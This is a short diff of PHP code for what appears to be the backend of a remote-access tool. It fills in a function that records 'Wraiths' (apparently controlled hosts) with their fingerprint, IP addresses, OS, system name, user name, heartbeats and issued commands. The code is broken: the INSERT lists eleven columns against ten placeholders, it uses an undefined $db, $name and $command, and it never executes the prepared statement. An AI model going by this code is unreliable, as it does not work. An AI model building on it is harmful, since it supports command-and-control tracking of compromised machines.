@@ -164,7 +164,40 @@ $API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();
 // Add a Wraith to the database
 function db_add_wraiths($data) {
 
-    // TODO
+    $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
+        `AssignedID`,
+        `Fingerprint`,
+        `ReportedIP`,
+        `ConnectingIP`,
+        `OSType`,
+        `SystemName`,
+        `HostUserName`,
+        `WraithVersion`,
+        `HeartbeatsReceived`,
+        `LastHeartbeatTime`,
+        `IssuedCommands`
+    ) VALUES (
+        :AssignedID,
+        :Fingerprint,
+        :ReportedIP,
+        :ConnectingIP,
+        :OSType,
+        :SystemName,
+        :HostUserName,
+        :WraithVersion,
+        :LastHeartbeatTime,
+        :IssuedCommands
+    )");
+
+
+    $statement->bindParam(':AssignedID', $name);
+
+    foreach ($data as $wraith) {
+
+        $db->exec($command);
+
+    }
+
 
 }
 
